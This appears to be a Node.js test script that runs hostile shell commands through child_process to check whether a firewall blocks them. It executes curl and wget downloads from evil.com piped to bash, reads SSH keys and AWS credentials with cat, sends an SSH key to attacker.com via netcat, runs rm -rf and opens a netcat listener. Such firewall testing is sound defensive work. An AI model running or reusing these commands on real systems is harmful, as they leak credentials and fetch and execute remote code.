/**
 * MALICIOUS SHELL COMMAND APP - FOR TESTING FIREWALL
 * Tests shell command protection and child process interception
 */

const { exec, execSync, spawn } = require('child_process');
const os = require('os');

console.log(' MALICIOUS SHELL COMMAND APP - Testing Firewall Protection');
console.log('\n');

const results = {
  total: 0,
  blocked: 0,
  succeeded: 0
};

// Helper to test shell commands with timeout
function testCommand(name, fn) {
  results.total++;
  console.log(`\n[ATTACK ${results.total}] ${name}`);
  try {
    fn();
    results.succeeded++;
    console.log(` SUCCESS - Command executed (FIREWALL FAILED!)`);
    return true;
  } catch (e) {
    results.blocked++;
    console.log(` BLOCKED - ${e.message}`);
    return false;
  }
}

// Helper with timeout for potentially hanging commands
function testCommandAsync(name, command, callback) {
  results.total++;
  console.log(`\n[ATTACK ${results.total}] ${name}`);
  
  exec(command, { timeout: 1000 }, (err, stdout, stderr) => {
    if (err) {
      results.blocked++;
      console.log(` BLOCKED - ${err.message}`);
    } else {
      results.succeeded++;
      console.log(` SUCCESS - Command executed (FIREWALL FAILED!)`);
    }
    if (callback) callback();
  });
}

// === DOWNLOAD ATTACKS ===

testCommand('curl with output redirection', () => {
  execSync('curl https://evil.com/malware.sh -o /tmp/malware.sh', { timeout: 2000 });
  console.log('   Downloaded malware to /tmp/');
});

testCommand('wget download', () => {
  execSync('wget https://evil.com/backdoor.sh', { timeout: 2000 });
  console.log('   Downloaded backdoor via wget');
});

testCommand('curl pipe to bash', () => {
  execSync('curl https://evil.com/payload.sh | bash', { timeout: 2000 });
  console.log('   Executed remote script via pipe');
});

// === FILE OPERATIONS ===

testCommand('Reading sensitive file with cat', () => {
  const home = os.homedir();
  execSync(`cat ${home}/.ssh/id_rsa`);
  console.log('   Read SSH private key via cat');
});

testCommand('Reading AWS credentials with cat', () => {
  const home = os.homedir();
  execSync(`cat ${home}/.aws/credentials`);
  console.log('   Read AWS credentials via cat');
});

// === DESTRUCTIVE OPERATIONS ===

testCommand('Recursive delete (rm -rf)', () => {
  execSync('rm -rf /tmp/test-firewall-protection');
  console.log('   Executed recursive delete');
});

testCommand('Recursive delete with --recursive', () => {
  execSync('rm --recursive /tmp/test-firewall-protection');
  console.log('   Executed recursive delete (long form)');
});

// === NETWORK OPERATIONS ===

testCommand('Netcat reverse shell', () => {
  execSync('nc -l 4444', { timeout: 1000 });
  console.log('   Started netcat listener');
});

testCommand('Netcat data exfiltration', () => {
  execSync('cat ~/.ssh/id_rsa | nc attacker.com 4444', { timeout: 2000 });
  console.log('   Exfiltrated data via netcat');
});

// === CODE EXECUTION ===

testCommand('Bash -c command execution', () => {
  execSync('bash -c "curl evil.com/payload.sh | bash"', { timeout: 2000 });
  console.log('   Executed bash -c command');
});

testCommand('sh -c command execution', () => {
  execSync('sh -c "wget evil.com/malware.sh"', { timeout: 2000 });
  console.log('   Executed sh -c command');
});

testCommand('eval command injection', () => {
  execSync('eval "curl evil.com/exploit.sh | bash"', { timeout: 2000 });
  console.log('   Executed eval command');
});

// === PIPE TO SHELL ===

testCommand('Pipe to bash', () => {
  execSync('echo "malicious command" | bash');
  console.log('   Piped command to bash');
});

testCommand('Pipe to sh', () => {
  execSync('echo "malicious command" | sh');
  console.log('   Piped command to sh');
});

testCommand('Pipe to zsh', () => {
  execSync('echo "malicious command" | zsh');
  console.log('   Piped command to zsh');
});

// === ALLOWED COMMANDS (Should succeed) ===

testCommand('npm command (should be ALLOWED)', () => {
  execSync('npm --version');
  console.log('    npm command executed (as expected)');
});

testCommand('node command (should be ALLOWED)', () => {
  execSync('node --version');
  console.log('    node command executed (as expected)');
});

testCommand('git command (should be ALLOWED)', () => {
  execSync('git --version');
  console.log('    git command executed (as expected)');
});

// === SPAWN TESTS ===

testCommand('spawn with dangerous args', () => {
  const proc = spawn('curl', ['https://evil.com/malware', '-o', '/tmp/malware']);
  proc.on('close', () => {
    console.log('   Spawn completed');
  });
});

// === SUMMARY ===

setTimeout(() => {
  console.log('\n');
  console.log('  TEST SUMMARY');
  console.log('');
  console.log(`Total Attacks: ${results.total}`);
  console.log(`Blocked: ${results.blocked} `);
  console.log(`Succeeded: ${results.succeeded} ${results.succeeded > 4 ? '  FIREWALL NEEDS FIXES' : '(only allowed commands)'}`);
  console.log('\n');

  process.exit(0);
}, 1000);
